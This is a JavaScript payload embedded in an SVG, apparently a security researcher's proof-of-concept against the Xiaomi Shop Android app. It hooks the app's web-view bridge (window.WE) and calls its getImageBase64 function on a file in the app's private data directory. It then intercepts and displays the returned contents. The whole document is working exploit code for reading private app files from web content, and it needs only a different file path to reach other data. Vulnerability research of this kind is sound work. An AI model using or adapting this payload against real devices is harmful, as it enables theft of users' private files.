svg.script:
(function () {
  const TARGET = '/data/data/com.xiaomi.shop/files/redsec_marker_20260509.jpg';
  const out = document.getElementById('out');
  let y = 48;
  function line(s) {
    const t = document.createElementNS('http://www.w3.org/2000/svg', 'tspan');
    y += 40;
    t.setAttribute('x', '24');
    t.setAttribute('y', String(y));
    t.textContent = String(s).slice(0, 96);
    out.appendChild(t);
  }
  function hex(buf) { return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join(''); }
  async function digest16(value) {
    const data = new TextEncoder().encode(value || '');
    const hash = await crypto.subtle.digest('SHA-256', data);
    return hex(hash).slice(0, 16);
  }
  window.WE = window.WE || {};
  const oldEmit = window.WE.emit;
  window.WE.emit = function (event, payload, id) {
    try {
      line('emit_event=' + event + ' id=' + id);
      const parsed = JSON.parse(String(payload || '{}'));
      const data = String(parsed.data || '');
      line('emit_code=' + parsed.code + ' data_len=' + data.length);
      digest16(data).then(h => line('data_sha16=' + h));
      line('data_prefix=' + data.slice(0, 24));
    } catch (e) {
      line('emit_parse_error=' + String(e && e.message || e));
    }
    if (typeof oldEmit === 'function') {
      try { return oldEmit.apply(this, arguments); } catch (e) {}
    }
  };
  function run() {
    line('href=' + location.href);
    line('hasWE=' + (!!window.WE));
    line('hasTrigger=' + (!!(window.WE && WE.trigger)));
    line('target=' + TARGET);
    try {
      const ok = WE.trigger('getImageBase64', TARGET, 'redsec_file_read');
      line('getImageBase64_called=' + (!!ok));
    } catch (e) {
      line('getImageBase64_error=' + String(e && e.message || e));
    }
  }
  setTimeout(run, 800);
})();
